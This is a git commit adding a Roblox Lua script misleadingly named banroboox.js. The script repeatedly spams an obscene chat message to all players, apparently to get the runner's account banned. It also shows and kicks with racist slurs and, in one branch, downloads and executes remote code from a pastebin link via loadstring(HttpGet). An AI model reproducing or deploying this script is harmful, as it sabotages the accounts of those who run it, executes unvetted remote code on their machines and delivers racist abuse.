c553abc5440a10e6f1a6bc9935f07efd27548605
imnotgoodatnames <99852875+imnotgoodatnames@users.noreply.github.com>
2023-01-06 18:22:41 -0800

    Create banroboox.js

---
+++ banroboox.js
@@ -0,0 +1,151 @@
+local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             
+local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             local A_1 = "sonicfurryballsex"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+wait (0.0001)                                                                             
+if PlaceId == 0 then
+            game.StarterGui:SetCore("SendNotification", {
+           Icon = "";
+            Title = "nigger", 
+            Text = "nigger"
+        })
+    wait(1.5)
+    loadstring(game:HttpGet('https://pastebin.com/raw/RCrG4syR',true))()
+    else
+ game.Players.LocalPlayer:kick("FUCK YOU NIGGER BITCH ASS NIGGER ASS")
+ wait(1)
+ game:Shutdown()
+end
